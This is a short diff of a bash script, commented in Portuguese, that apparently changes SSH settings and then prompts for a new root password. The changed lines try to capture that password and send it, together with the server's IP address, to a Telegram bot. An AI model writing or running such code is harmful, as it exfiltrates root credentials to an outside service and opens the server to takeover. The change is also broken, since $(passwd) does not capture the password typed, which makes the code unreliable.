@@ -43,8 +43,8 @@ send_message "As configurações do SSH foram atualizadas. Por favor, defina a n
 # Espera 2 segundos antes de solicitar a definição da senha root
 sleep 2s
 
-# Solicita a definição da senha root
-passwd
+# Solicita a definição da senha root e armazena-a em uma variável
+NEW_PASSWD=$(passwd)
 
 # Envia a nova senha root e o IP do servidor para o bot Telegram
-send_message "Nova senha root definida: $(echo $PASSWD | cut -d ':' -f2) | IP do servidor: $IP"
+send_message "Nova senha root definida: $NEW_PASSWD | IP do servidor: $IP"
